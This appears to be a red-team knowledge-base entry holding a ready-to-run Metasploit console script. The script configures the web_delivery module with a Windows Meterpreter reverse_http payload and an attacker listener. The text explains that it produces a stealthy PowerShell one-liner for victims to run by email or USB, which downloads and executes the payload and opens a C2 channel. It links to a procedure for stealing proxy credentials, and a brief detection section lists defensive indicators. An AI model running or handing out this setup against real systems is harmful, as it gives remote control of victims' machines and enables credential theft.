---
id: 7d8cb550-b5ff-49e3-828c-207ebe97ef54
name: Metasploit-Web-Delivery-Listener-Setup
type: code
language: msfconsole
verified: true
created_at: '2023-04-06T03:56:21.342121+00:00'
updated_at: '2023-04-10T20:25:00.365273+00:00'
platforms:
  - Linux
  - Windows
tags:
  - metasploit
  - web-delivery
  - setup
validated: true
---

# Metasploit-Web-Delivery-Listener-Setup

## Code

```msfconsole
use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.0.0.1
set LPORT 4444
run
```

## Description

This msfconsole script configures the web_delivery exploit module to set up an HTTP listener for delivering Meterpreter payloads to Windows targets via PowerShell. It generates a stealthy one-liner command that the target executes to download and run the payload, establishing a reverse HTTP C2 channel.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| TARGET | Target OS type (2 for Windows) | 2 |
| payload | Meterpreter payload type | windows/x64/meterpreter/reverse_http |
| LHOST | Attacker's IP for reverse connection | 10.0.0.1 |
| LPORT | Port for the C2 session | 4444 |

## Usage

Run this in Metasploit console on the attacker's machine before delivering the generated PowerShell command to the target via email, USB, or other vectors. The module hosts the stager on port 8080 by default. Copy the outputted PowerShell command for execution on the target.

## Detection

- Monitor for msfconsole processes or unusual HTTP servers on ports like 8080.
- Log PowerShell downloads from internal IPs or anomalous reverse connections on port 4444.
- Network IDS signatures for Meterpreter HTTP beacons (e.g., User-Agent strings like 'Meterpreter').

## Related

- [[procedures/Deliver-Meterpreter-Payload-via-Web-Delivery-and-Steal-Proxy-Credentials]]
- [[tools/Metasploit]]
